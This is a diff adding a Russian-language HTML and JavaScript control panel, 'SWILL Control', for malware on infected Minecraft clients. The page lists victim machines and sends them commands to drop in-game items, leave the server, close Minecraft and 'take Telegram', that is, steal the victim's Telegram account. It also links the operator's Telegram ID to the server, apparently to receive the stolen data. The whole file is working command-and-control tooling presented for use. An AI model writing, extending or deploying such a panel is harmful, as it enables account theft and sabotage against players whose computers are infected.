@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SWILL Control Panel</title>
+<style>
+  :root {
+    --bg: #0b0d14; --panel: rgba(22, 25, 37, 0.7); --border: rgba(255, 255, 255, 0.08);
+    --text: #e2e8f0; --text-muted: #94a3b8; --orange: #f97316; --blue: #3b82f6;
+    --red: #ef4444; --green: #10b981; --purple: #8b5cf6;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
+  body {
+    background: var(--bg); background-image: radial-gradient(circle at 15% 50%, rgba(249, 115, 22, 0.08), transparent 25%), radial-gradient(circle at 85% 30%, rgba(59, 130, 246, 0.08), transparent 25%);
+    color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
+  }
+  .container {
+    background: var(--panel); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+    border: 1px solid var(--border); border-radius: 24px; padding: 40px; width: 100%; max-width: 600px;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); animation: fadeUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+  h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; text-align: center; background: linear-gradient(to right, #fff, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .subtitle { text-align: center; color: var(--text-muted); font-size: 14px; margin-bottom: 30px; }
+  
+  .input-wrapper { position: relative; margin-bottom: 20px; }
+  .input-wrapper input {
+    width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--border); color: var(--text);
+    padding: 16px; border-radius: 12px; font-size: 15px; outline: none; transition: 0.2s;
+  }
+  .input-wrapper input:focus { border-color: var(--blue); background: rgba(0,0,0,0.4); }
+
+  .select-wrapper { position: relative; margin-bottom: 24px; }
+  .select-wrapper::after { content: '▼'; font-size: 10px; position: absolute; right: 16px; top: 50%; transform: translateY(-50%); color: var(--text-muted); pointer-events: none; }
+  select { width: 100%; appearance: none; background: rgba(0, 0, 0, 0.3); border: 1px solid var(--border); color: var(--text); padding: 16px; border-radius: 12px; font-size: 15px; outline: none; cursor: pointer; transition: all 0.2s; }
+  select:hover, select:focus { border-color: rgba(255, 255, 255, 0.2); background: rgba(0, 0, 0, 0.4); }
+  
+  .buttons { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 24px; }
+  button { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 16px; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; color: #fff; cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); position: relative; overflow: hidden; }
+  button::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255, 255, 255, 0.1); opacity: 0; transition: opacity 0.2s; }
+  button:hover::before { opacity: 1; }
+  button:active { transform: scale(0.98); }
+  button svg { width: 20px; height: 20px; fill: currentColor; }
+  .btn-drop { background: linear-gradient(135deg, #f97316, #ea580c); box-shadow: 0 4px 15px rgba(249, 115, 22, 0.3); }
+  .btn-leave { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3); }
+  .btn-close { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3); }
+  .btn-purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3); }
+  
+  #log { background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 16px; height: 200px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; line-height: 1.6; color: #a7b5c8; }
+  #log::-webkit-scrollbar { width: 6px; }
+  #log::-webkit-scrollbar-track { background: transparent; }
+  #log::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+  .log-success { color: var(--green); } .log-error { color: var(--red); } .log-info { color: var(--blue); }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>SWILL Control</h1>
+  <div class="subtitle">Управление клиентами в реальном времени</div>
+  
+  <div class="input-wrapper">
+    <input type="text" id="tgId" placeholder="Ваш Telegram ID (цифры от @userinfobot)" onchange="setTgId()">
+  </div>
+
+  <div class="select-wrapper">
+    <select id="client"><option value="ALL">Загрузка...</option></select>
+  </div>
+  
+  <div class="buttons">
+    <button class="btn-drop" onclick="send('drop_items')">
+      <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14l-5-5 1.41-1.41L12 14.17l4.59-4.58L18 11l-6 6z"/></svg>
+      Выбросить предметы
+    </button>
+    <button class="btn-leave" onclick="send('leave_server')">
+      <svg viewBox="0 0 24 24"><path d="M10.09 15.59L11.5 17l5-5-5-5-1.41 1.41L12.67 11H3v2h9.67l-2.58 2.59zM19 3H5c-1.11 0-2 .9-2 2v4h2V5h14v14H5v-4H3v4c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg>
+      Выйти с сервера (Ban)
+    </button>
+    <button class="btn-purple" onclick="send('steal_telegram')">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-4-4 1.41-1.41L11 14.17l6.59-6.59L19 9l-8 8z"/></svg>
+      Забрать Telegram
+    </button>
+    <button class="btn-close" onclick="send('close_minecraft')">
+      <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+      Закрыть Minecraft
+    </button>
+  </div>
+  <div id="log"><div class="log-info">> Ожидание авторизации...</div></div>
+</div>
+<script>
+const TOKEN = prompt('Введите Admin Token:');
+const log = (msg, type = 'info') => {
+  const d = document.getElementById('log');
+  const div = document.createElement('div');
+  div.className = 'log-' + type;
+  div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+  d.appendChild(div);
+  d.scrollTop = d.scrollHeight;
+};
+
+async function setTgId() {
+  const chatId = document.getElementById('tgId').value;
+  if (!chatId) return;
+  log('Сохранение Telegram ID...', 'info');
+  try {
+    const r = await fetch('/api/set-tg', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chatId })
+    });
+    if (r.ok) log('Telegram ID успешно привязан к серверу!', 'success');
+    else log('Ошибка сохранения ID', 'error');
+  } catch (e) { log('Ошибка соединения', 'error'); }
+}
+
+async function refresh() {
+  try {
+    const r = await fetch('/api/clients', { headers: { 'x-admin-token': TOKEN } });
+    if (!r.ok) throw new Error('401');
+    const list = await r.json();
+    const sel = document.getElementById('client');
+    const currentVal = sel.value;
+    sel.innerHTML = `<option value="ALL">🌐 Все клиенты (${list.length})</option>` + list.map(id => `<option value="${id}">🖥️ ${id}</option>`).join('');
+    sel.value = currentVal;
+  } catch (e) {}
+}
+
+async function send(command) {
+  const clientId = document.getElementById('client').value;
+  log(`Отправка команды: ${command}...`, 'info');
+  try {
+    const r = await fetch('/api/command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-admin-token': TOKEN },
+      body: JSON.stringify({ clientId, command })
+    });
+    const data = await r.json();
+    if (data.success) log(`Успешно (${data.sent} клиентов)`, 'success');
+    else log(`Ошибка: ${data.error}`, 'error');
+  } catch (e) { log(`Ошибка соединения`, 'error'); }
+}
+
+refresh(); setInterval(refresh, 3000);
+log('Панель готова к работе.', 'success');
+</script>
+</body>
+</html>
